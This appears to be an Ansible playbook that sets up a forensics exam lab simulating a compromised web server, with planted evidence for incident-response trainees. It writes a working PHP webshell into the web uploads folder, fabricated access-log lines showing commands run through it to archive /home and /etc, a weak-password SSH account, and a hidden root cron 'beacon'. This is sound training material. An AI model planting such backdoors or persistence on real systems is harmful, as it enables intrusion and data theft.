---
# for-t2-exam "Full Report" — combines for-t2-webshell (log+disk forensics
# on a popped web server) with capture analysis. http-session.pcap shows
# the upload+exfil; the host holds webshell, exfil dir, and persistence.

- name: packages
  ansible.builtin.apt:
    name: [apache2, php, libapache2-mod-php, openssh-server]
    state: present
    update_cache: true

- name: IR analyst account (creds documented in the briefing)
  ansible.builtin.user:
    name: analyst
    password: "{{ 'analysis' | password_hash('sha512') }}"
    shell: /bin/bash
    home: /home/analyst
    create_home: true
    groups: [adm]
    append: true

- name: ssh password auth for the analyst
  ansible.builtin.lineinfile:
    path: /etc/ssh/sshd_config
    regexp: "^#?PasswordAuthentication"
    line: "PasswordAuthentication yes"
  notify: restart sshd

- name: sshd_config.d drop-in wins over cloud-image defaults
  ansible.builtin.copy:
    dest: /etc/ssh/sshd_config.d/00-pentrain-password.conf
    content: "PasswordAuthentication yes\n"
    mode: "0644"
  notify: restart sshd

- name: evidence drop
  ansible.builtin.file:
    path: /var/evidence
    state: directory
    mode: "0755"

- name: plant the capture (make_capture_pcap.py fullreport)
  ansible.builtin.copy:
    src: http-session.pcap
    dest: /var/evidence/http-session.pcap
    mode: "0644"

- name: webshell artifact — matches the pcap exactly
  ansible.builtin.file:
    path: /var/www/html/uploads
    state: directory
    owner: www-data
    group: www-data
    mode: "0755"

- name: the dropped shell
  ansible.builtin.copy:
    dest: /var/www/html/uploads/shell.phtml
    content: "<?php system($_GET['c']); ?>\n"
    owner: www-data
    group: www-data
    mode: "0644"

- name: flag must be read on the box — only flag.txt is denied over HTTP
  ansible.builtin.blockinfile:
    path: /etc/apache2/apache2.conf
    marker: "# {mark} PENTRAIN FOR-T2-EXAM FLAG DENY"
    block: |
      <LocationMatch "^/uploads/flag\.txt">
        Require all denied
      </LocationMatch>
  notify: restart apache2

- name: apache access log carrying the attack (timestamps align with pcap)
  ansible.builtin.copy:
    dest: /var/log/apache2/intranet-access.log
    content: |
      10.9.9.9 - - [14/Nov/2024:09:12:31 +0000] "POST /upload.php HTTP/1.1" 200 24 "-" "python-requests/2.31"
      10.9.9.9 - - [14/Nov/2024:09:12:47 +0000] "GET /uploads/shell.phtml?c=id HTTP/1.1" 200 51 "-" "curl/8.5"
      10.9.9.9 - - [14/Nov/2024:09:13:02 +0000] "GET /uploads/shell.phtml?c=tar%20czf%20/var/backups/exfil.tar.gz%20/home%20/etc HTTP/1.1" 200 2 "-" "curl/8.5"
      10.9.9.9 - - [14/Nov/2024:09:13:20 +0000] "GET /var/backups/exfil.tar.gz HTTP/1.1" 200 51 "-" "curl/8.5"
    mode: "0644"

- name: exfil staging dir — what the archive was built from
  ansible.builtin.file:
    path: /var/backups/exfil
    state: directory
    mode: "0755"

- name: the archive itself (real, listable)
  ansible.builtin.command: tar czf /var/backups/exfil.tar.gz -C /var/backups exfil
  args:
    creates: /var/backups/exfil.tar.gz

- name: persistence dir — the second implant the pcap never shows
  ansible.builtin.file:
    path: /var/lib/.sysmon
    state: directory
    mode: "0755"

- name: fake beacon script
  ansible.builtin.copy:
    dest: /var/lib/.sysmon/sysmon.sh
    content: |
      #!/bin/sh
      # system monitor — do not remove
      while true; do sleep 900; done
    mode: "0755"

- name: cron line calling it every hour
  ansible.builtin.cron:
    name: sysmon housekeeping
    minute: "17"
    job: "/var/lib/.sysmon/sysmon.sh"
    user: root
    cron_file: pentrain-t2-exam
